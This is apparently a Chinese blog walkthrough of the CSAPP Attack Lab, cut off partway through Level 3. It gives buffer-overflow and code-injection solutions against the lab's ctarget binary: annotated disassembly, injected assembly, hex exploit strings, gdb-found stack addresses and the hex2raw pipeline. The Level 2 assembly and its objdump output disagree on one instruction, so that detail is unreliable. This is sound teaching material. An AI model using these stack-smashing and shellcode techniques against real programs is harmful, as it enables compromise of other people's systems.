<li><p>您的任务是让 CTARGET 在 getbuf 执行其 return 语句时执行 touch1 的代码，而不是返回测试</p>
</li>
<li><p>说明文档的一些建议</p>
<ul>
<li>通过命令 <strong>objdump -d .&#x2F;ctarget &gt;&gt; ctarget.s</strong> 得到反汇编的 CTARGET 版本</li>
<li>定位 touch1 起始地址的字节表示，以便 getbuf 代码末尾的 ret 指令将控制权转移到 touch1</li>
<li>注意字节排序</li>
</ul>
</li>
<li><p>分析 test 的汇编代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp					# %rsp -= 0x8</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401971:	e8 32 fe ff ff       	callq  4017a8 &lt;getbuf&gt;				# 调用 getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx					# %edx = %eax</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi				# %esi = 0x403188</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401987:	e8 64 f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp					# %rsp += 0x8</span><br><span class="line">  401990:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>

<ul>
<li><p>test 调用 getbuf 后，如果成功返回到 test，调用 print_chk 打印字符串：**”No exploit.  Getbuf returned 0x%x\n”** </p>
</li>
<li><p>getbuf 执行 return 时将会返回到地址 <strong>0x401976</strong></p>
</li>
<li><p>分析 getbuf 的汇编代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp		# %rsp -= 0x28</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi		# %rdi = %rsp</span><br><span class="line">  4017af:	e8 8c 02 00 00       	callq  401a40 &lt;Gets&gt;	# 调用 Gets</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax		# %eax = 0x1</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp		# %rsp += 0x28</span><br><span class="line">  4017bd:	c3                   	retq   					# return</span><br></pre></td></tr></table></figure>

<ul>
<li><p>getbuf 的栈帧分配 <strong>0x28（40）</strong> 个字节的空间，调用 Gets 读取字符串从 %rsp 开始向上写入</p>
</li>
<li><p>思路分析</p>
<ul>
<li>输入超过 40 个字节的字符串，从而造成栈溢出，修改返回地址为 touch1 的起始地址</li>
</ul>
</li>
<li><p>分析 touch1 的汇编代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp				# %rsp -= 0x8</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi			# %edi = 0x4030c5</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 &lt;puts@plt&gt;		# 调用 puts</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi				# %edi = 0x1</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	callq  401c8d &lt;validate&gt;		# 调用 validate</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi				# %edi = 0x0</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	callq  400e40 &lt;exit@plt&gt;		# 调用 exit</span><br></pre></td></tr></table></figure>

<ul>
<li>touch1 的起始地址为 <strong>0x4017c0</strong>，通过 puts 打印字符串：**”Touch1!: You called touch1()”**</li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><p>getbuf 的缓冲区大小为 40 字节，前 40 个字节可以随便输入， 后边的值为 touch1 的起始地址 0x4017c0</p>
</li>
<li><p>我们通过说明文档推荐的方式解决：创建一个 Level1.txt 文件，写入我们想要输入的值的字节级表示</p>
<blockquote>
<p>每个字节的值（两位 16 进制）中间用空格隔开</p>
<p>注意书写顺序，x86 采用小端法</p>
<p>Ubuntu 系统下通过命令 touch Level1.txt 创建文件</p>
</blockquote>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// touch1 起始地址</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level1.txt | .&#x2F;ctarget -q</strong> 完成注入<ul>
<li><strong>hex2raw</strong> 是用于生成攻击字符串的实用程序，将 16 进制的字节级表示转换为攻击字符串</li>
<li><strong>|</strong> 表示管道，将转换后的攻击字符串作为 ctarget 的参数</li>
<li><strong>-q</strong> 表示取消连接 CMU 的服务器，连接是默认的，一般我们连接不上 ……</li>
</ul>
</li>
</ul>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240311201249891.png" class="" title="image-20240311201249891">

<h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><ul>
<li><p>第 2 阶段涉及注入少量代码作为漏洞利用字符串的一部分</p>
</li>
<li><p>在文件 ctarget 中，有一个函数 touch2 的代码，具有以下 C 表示形式</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">6</span><br><span class="line">2 &#123;</span><br><span class="line"><span class="number">3</span> 		vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">4</span> 		<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="number">5</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="number">6</span> 			validate(<span class="number">2</span>);</span><br><span class="line"><span class="number">7</span> 		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">8</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="number">9</span> 			fail(<span class="number">2</span>);</span><br><span class="line"><span class="number">10</span> 		&#125;</span><br><span class="line"><span class="number">11</span> 			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">12</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>您的任务是让 CTARGET 执行 touch2 的代码，而不是返回测试</p>
</li>
<li><p>但是，在这种情况下，您必须使其看起来像 touch2，就好像您已将 cookie 作为其参数传递一样</p>
<blockquote>
<p>将 cookie 的值作为 touch2 的参数传递</p>
</blockquote>
</li>
<li><p>说明文档的一些建议</p>
<ul>
<li>您需要定位注入代码地址的字节表示，以便 getbuf 代码末尾的 ret 指令将控制权转移给它</li>
<li>回想一下，函数的第一个参数是在寄存器 %rdi 中传递的</li>
<li>您注入的代码应将寄存器设置为您的 cookie，然后使用 ret 指令将控制权转移到 touch2 中的第一条指令</li>
<li>请勿尝试在漏洞利用代码中使用 <strong>jmp 或 call</strong> 指令，这些指令的目标地址的编码很难制定</li>
<li>请参阅附录 B 中关于如何使用工具生成指令序列的字节级表示的讨论</li>
</ul>
</li>
<li><p>分析 touch2 的汇编代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp					# %rsp -= 0x8</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx					# %edx = %edi</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;			# if %edi != cookie，跳转到 401824</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi				# %esi = 0x4030e8</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 打印 &quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span><br><span class="line">  401818:	bf 02 00 00 00       	mov    $0x2,%edi					# %edi = 0x2</span><br><span class="line">  40181d:	e8 6b 04 00 00       	callq  401c8d &lt;validate&gt;			# 调用 validate</span><br><span class="line">  401822:	eb 1e                	jmp    401842 &lt;touch2+0x56&gt;			# 直接跳转到 401842</span><br><span class="line">  401824:	be 10 31 40 00       	mov    $0x403110,%esi				# %esi = 0x403110</span><br><span class="line">  401829:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi= 0x1</span><br><span class="line">  40182e:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401833:	e8 b8 f5 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 打印 &quot;Misfire: You called touch2(0x%.8x)\n&quot;</span><br><span class="line">  401838:	bf 02 00 00 00       	mov    $0x2,%edi					# %edi = 0x2</span><br><span class="line">  40183d:	e8 0d 05 00 00       	callq  401d4f &lt;fail&gt;				# 调用 fail</span><br><span class="line">  401842:	bf 00 00 00 00       	mov    $0x0,%edi					# %edi = 0x0</span><br><span class="line">  401847:	e8 f4 f5 ff ff       	callq  400e40 &lt;exit@plt&gt;			# 调用 exit</span><br></pre></td></tr></table></figure>

<ul>
<li><p>touch2 将传递的参数和 cookie 进行对比，如果传入的参数值等于 cookie，输出 **”Touch2!: You called touch2(0x%.8x)\n”**，否则输出 <strong>“Misfire: You called touch2(0x%.8x)\n”</strong> </p>
</li>
<li><p>思考</p>
<ul>
<li>任务变得复杂了，仅仅通过栈溢出修改返回地址为 touch2 的起始地址是不行的，还需要将 cookie 作为 touch2 的参数</li>
<li>可以通过注入代码来实现，在注入代码前，我们要明白怎么才能让程序执行我们注入的代码</li>
<li>getbuf 执行 return 时会从相邻的上一个栈帧中取出返回地址并执行</li>
<li>我们可以把指令的字节级表示存储在一个地方，通过栈溢出的方式修改 return 语句的返回地址为存储注入代码的地址，return 执行时就会执行我们注入的代码了</li>
</ul>
</li>
<li><p>思路分析</p>
<ul>
<li><p>通过 getbuf 将注入的代码存储在 getbuf 的栈帧中，也就是说此时存储注入代码的地址就是 getbuf 的 %rsp</p>
</li>
<li><p>通过栈溢出的方式修改 getbuf 执行return 时的返回地址为 getbuf 的 %rsp</p>
</li>
<li><p>注入代码的内容</p>
<ul>
<li><p>通过 movq 将 cooike 的值存储在 %rdi 中作为 touch2 的参数，跳转到 touch2 的起始地址</p>
</li>
<li><p>对于跳转，通过 pushq 将 touch2 的起始地址入栈，通过 ret 从栈中取出 touch2 的起始地址并执行，即通过 pushq + ret 实现跳转</p>
<blockquote>
<p>说明文档提醒我们不要使用 jmp 或 call 等跳转指令</p>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
<li><p>我们需要找到 getbuf 栈帧的起始地址 %rsp 的值，通过 gdb 调试工具在 getbuf 的 0x4017ac 处设置断点，查看 %rsp 为 <strong>0x5561dc78</strong></p>
</li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240312161155532.png" class="" title="image-20240312161155532">

<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li><p>打开 cookie.txt 文件查看 cookie 的值为 <strong>0x59b997fa</strong></p>
</li>
<li><p>创建一个 Level2.s 文件，写入需要注入代码的汇编形式</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi	</span><br><span class="line">pushq 0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>gcc -c Level2.s</strong> 生成二进制文件 Level2.o </li>
<li>通过命令 <strong>objdump -d Level2.o &gt; Level2.d</strong> 生成文件 Level2.d，即通过反汇编工具生成汇编代码对应的字节级表示</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Level2.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi</span><br><span class="line">   7:	68 ec 17 40 00       	pushq  $0x4017ec</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<ul>
<li>创建 Level2.txt 文件，写入输入值的字节级表示</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span>	<span class="comment">// 指令的字节级表示</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>	<span class="comment">// getbuf 的 %rsp</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;hex2raw &lt; Level2.txt | .&#x2F;ctarget -q</strong> 将字节级表示转换为字符串作为参数运行程序</li>
</ul>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240312162217620.png" class="" title="image-20240312162217620">

<h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><ul>
<li>第 3 阶段还涉及代码注入攻击，但将字符串作为参数传递</li>
<li>在文件 ctarget 中，有函数 hexmatch 和 touch3 的代码，具有以下 C 表示形式</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="number">2</span> <span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span></span><br><span class="line">3 &#123;</span><br><span class="line"><span class="number">4</span> 		<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="number">5</span> 		<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line"><span class="number">6</span> 		<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line"><span class="number">7</span> 		<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="number">8</span> 		<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="number">9</span> &#125;</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> <span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span></span><br><span class="line">12 &#123;</span><br><span class="line"><span class="number">13</span> 		vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="number">14</span> 		<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line"><span class="number">15</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="number">16</span> 			validate(<span class="number">3</span>);</span><br><span class="line"><span class="number">17</span> 		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">18</span> 			<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="number">19</span> 			fail(<span class="number">3</span>);</span><br><span class="line"><span class="number">20</span> 		&#125;</span><br><span class="line"><span class="number">21</span> 		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">22</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>您的任务是让 CTARGET 执行 touch3 的代码，而不是返回测试</p>
</li>
<li><p>您必须让它看起来像 touch3，就好像您已经传递了 cookie 的字符串表示形式作为其参数一样</p>
<blockquote>
<p>将 cookie 字符串的字节级表示作为 touch3 的参数传递</p>
</blockquote>
</li>
<li><p>说明文档的一些建议</p>
<ul>
<li>您需要在漏洞利用字符串中包含 cookie 的字符串表示形式；字符串应由八个十六进制数字组成（从最高到最低有效排序），不带前导 0x</li>
<li>回想一下，字符串在 C 中表示为字节序列，后跟值为 0 的字节；在任何 Linux 机器上键入 man ascii 以查看所需字符的字节表示形式</li>
<li>注入的代码应将寄存器 %rdi 设置为此字符串的地址</li>
<li>当调用函数 hexmatch 和 strncmp 时，它们会将数据推送到堆栈上，覆盖保存 getbuf 使用的缓冲区的内存部分。因此，您需要小心放置 cookie 的字符串表示形式的位置</li>
</ul>
</li>
<li><p>分析 touch3 的汇编代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx				</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx					# %rbx = %rdi</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi					# %rsi = %rdi</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt; %edi = cookie</span><br><span class="line">  401911:	e8 36 ff ff ff       	callq  40184c &lt;hexmatch&gt;			# 调用 hexmatch</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax			</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;			# if %eax == 0，跳转到 40193d</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx					# %rdx = %rbx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi				# %esi = 0x403138</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = 0x1</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi					# %edi = 0x3</span><br><span class="line">  401936:	e8 52 03 00 00       	callq  401c8d &lt;validate&gt;			# 调用 validate</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;			# 直接跳转到 40195e</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx					# %rdx = %rbx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi				# %esi = 0x403160</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi					# %edi = x01</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	callq  400df0 &lt;__printf_chk@plt&gt;	# 调用 print_chk</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi					# %edi = 0x3</span><br><span class="line">  401959:	e8 f1 03 00 00       	callq  401d4f &lt;fail&gt;				# 调用 fail</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi					# %edi = 0x0</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	callq  400e40 &lt;exit@plt&gt;			# 调用 exit</span><br></pre></td></tr></table></figure>

<ul>
<li><p>touch3 调用 hexmatch 将传递的字符串参数和 cookie 比较，如果参数是 cookie 的字符串形式，输出 **”Touch3!: You called touch3(&quot;%s&quot;)\n”**，否则输出 <strong>“Misfire: You called touch3(&quot;%s&quot;)\n”</strong></p>
</li>
<li><p>touch3 的起始地址为 <strong>0x4018fa</strong></p>
</li>
<li><p>思路分析</p>
<ul>
<li><p>通过命令 man ascii 查看 cookie 的字符串 “59b997fa” 的字节级表示为 <strong>35 39 62 39 39 37 66 61</strong></p>
</li>
<li><p>说明文档提醒我们 hexmatch 可能会覆盖 getbuf 的缓冲区，因此我们不能将字符串存储在 getbuf 的栈帧中，但我们可以把它存储在 test 的栈帧中</p>
</li>
<li><p>通过栈溢出的方式，修改 getbuf 的返回地址为 getbuf 的 %rsp 并将 cookie 的字符串的字节级表示存储在 test 的栈帧中</p>
</li>
<li><p>通过getbuf 将注入代码存储在 getbuf 的栈帧中</p>
</li>
<li><p>注入代码将存储在 test 栈帧中的字符串设置为 touch3 的参数，并跳转到 touch3 的起始地址</p>
</li>
</ul>
</li>
<li><p>我们需要 test 的 %rsp 来确定存储在 test 栈帧中的 cookie 字符串的起始地址</p>
</li>
<li><p>通过 gdb 调试工具在 getbuf 的 0x4017a8 处设置断点，查看 test 的 %rsp 的值为 <strong>0x5561dca0</strong>，所以 test 栈帧存储字符串的起始地址为 <strong>0x5561dca8</strong></p>
</li>
</ul>
<img src="/2024/03/11/CSAPP-Lab3/image-20240313115138026.png" class="" title="image-20240313115138026">

<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>getbuf 的 %rsp 仍然为 <strong>0x5561dc78</strong></li>
<li>创建 Level3.s 文件，写入注入代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x5561dca8,%rdi</span><br><span class="line">pushq $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>gcc -c Level3.s</strong> 生成二进制文件 Level3.o</li>
<li>通过命令 <strong>objdump -d Level3.o &gt; Level3.d</strong> 得到 Level3.d，汇编代码的字节级表示</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Level3.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">   7:	68 fa 18 40 00       	pushq  $0x4018fa</span><br><span class="line">   c:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<ul>
<li>创建 Level3.txt 文件，写入输入值的字节级表示</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span>	<span class="comment">// 指令的字节级表示</span></span><br><span class="line">fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="number">00</span> 